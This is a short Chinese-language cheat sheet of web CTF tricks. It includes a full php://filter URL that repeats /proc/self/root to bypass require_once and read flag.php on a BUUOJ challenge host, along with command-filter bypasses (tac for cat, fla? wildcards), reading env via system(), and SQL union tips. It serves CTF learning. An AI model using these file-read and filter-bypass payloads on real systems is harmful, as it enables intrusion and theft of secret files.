# Web知识

1. session的存放目录为`/runtime/session/xxx`
1. 可以通过故意访问不存在的目录来通过报错获取网站的框架
1. 存放flag的文件一般就是flag
1. POST传参优先级高于GET，如果参数名称相同，POST的值会覆盖FET的值，可以用于部分绕过
1. eval()函数在PHP和js里都有，可以用`Error().stack`测试判断到底是什么语言
1. 可以通过vm.js、VM.run等语句判断vm2沙箱
1. 不知道flag在哪时可以`system("env");`看看环境变量
1. 网站观察源码没收获的时候可以目录扫描和抓包获取信息，通过文件泄露和隐藏传参获取信息
1. SQL联合查询时可以查询和group_concat多个值用逗号隔开
1. PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含：

* `/proc/self/`是指向当前进程的`/proc/pid/`，而`/proc/self/root`是指向`/`的软连接，所以让软连接层数变多即可造成重复包含

```
http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

11. 如果`cat`被过滤，可以用`tac`代替，为反向读取指令
12. 对flag敏感词的过滤可以用?代替其中一个字符如`fla?`
12. 如果不知道flag的路径,可以用`/proc/self/pwd/`代表是当前路径，构造`/proc/self/pwd/flag.txt`读取文件
